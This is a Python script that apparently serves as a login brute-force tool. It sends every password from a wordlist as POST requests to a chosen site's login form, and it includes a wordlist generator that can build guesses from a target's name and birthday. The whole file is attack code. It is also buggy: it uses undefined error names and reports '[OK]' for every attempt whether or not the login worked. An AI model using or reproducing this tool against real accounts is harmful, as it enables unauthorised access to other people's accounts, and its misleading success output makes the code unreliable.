try:
	import os
	import requests
	import itertools
except error as err:
	print("Error while importing required librairies. Please make sure to install required dependencies. Error : {}".format(err))

def forcegrief():
	try:
		fb = input("Please enter the wordlist file's name (eg. wordlist.txt) : ")
		try:
			f = open(str(fb), "r")
		except:
			print(error_codes["error"] + "Please verify the file's path is correct and try again - You can create a wordlist by using the goblin command" + color_codes["none"])
			cli()
			return False
	
		fd_username = input("Please enter the form's username field data (html: name="") : ")
		fd_password = input("Please enter the form's password field data (html: name="") : ")
		url = input("Please enter the site's url  : ")
		s_username = input("Please enter the username : ")
		s_password = []
		ints = 0
		for line in f:
			s_password.append(str(line))
			try:
				request(fd_username=fd_username, fd_password=fd_password, url=url, s_username=s_username, s_password=s_password, ints=ints)
			except error as err:
				print(color_codes["error"] + "Error while sending request : {}".format(err))
				cli()
			ints += 1
	except error as err:
		print(color_codes["error"] + "Error in forcegrief() : {}".format(err) + color_codes["none"])

def request(fd_username, fd_password, url, s_username, s_password, ints):
	try:
		requests.post(url, allow_redirects=False, data={
				str(fd_username): s_username,
				str(fd_password): str(s_password[ints])
		})
		print(color_codes["ok"] + "[OK] Username : " + s_username + ", Password : " + s_password[ints])
	except error as err:
		print(color_codes["error"] + "Error in request() : {}".format(err) + color_codes["none"])

def goblin():
	try:
		ban = '''
		                                                    '''
		
		print('\n------------------\n\n G 0 B L ! N \033[32m2.0\033[m | WORDGENERATOR\n\n~ by: UndeadSec and Sam Junior:@un00mz\n\n------------------\n')
		
		scale = input('\033[36m[!] provide a size scale [eg: "1 to 8" = 1:8] : ')
		start = int(scale.split(':')[0])
		final = int(scale.split(':')[1])
		
		use_nouse = str(input("\n\033[36m[?] Do you want to enter personal data ? [y/N]: "))
		if use_nouse == 'y':
			first_name = str(input("\n\033[36m[*] Fist Name: "))
			last_name = str(input("\n\033[36m[*] Last Name: "))
			birthday = str(input("\n\033[36m[*] Birthday: "))
			month = str(input("\n\033[36m[*] Month: "))
			year = str(input("\n\033[36m[*] Year: "))
			chrs = first_name + last_name + birthday + month + year
		else:
			chrs = 'abcdefghijklmnopqrstuvwxyz'
			pass
		
		chrs_up = chrs.upper()
		chrs_specials = '!\\][/?.,~-=";:><@#$%&*()_+\' '
		chrs_numerics = '1234567890'
		
		file_name = input('\n\033[36m[!] Insert a name for your wordlist file: ')
		arq = open(file_name, 'w')
		if input('\n\033[36m[?] Do you want to use uppercase characters? (y/n): ') == 'y':
			chrs = ''.join([chrs, chrs_up])
		if input('\n\033[36m[?] Do you want to use special characters? (y/n): ') == 'y':
			chrs = ''.join([chrs, chrs_specials])
		if input('\n\033[36m[?] Do you want to use numeric characters? (y/n): ') == 'y':
			chrs = ''.join([chrs, chrs_numerics])
		
		for i in range(start, final+1):
			for j in itertools.product(chrs, repeat=i):
				temp = ''.join(j)
				print(temp)
				arq.write(temp + '\n')
		arq.close()
		cli()
	except error as err:
		print(color_codes["error"] + "Goblin Error : {}".format(err) + color_codes["none"])
		cli()

def cli():
	cmd = input("<<>> ")
	try:
		os.system('cls')
	except error as err:
		print("Unable to activate color")
	if cmd == "goblin":
		goblin()
	elif cmd == "forcegrief":
		forcegrief()
	elif cmd == "exit":
		print("Closing...")

if __name__ == "__main__":
	global error_codes
	color_codes = {"ok": "\u001b[92m",
				   "warning": "\u001b[93m",
				   "error": "\u001b[91m",
				   "none": "\u001b[0m"}
	cli()
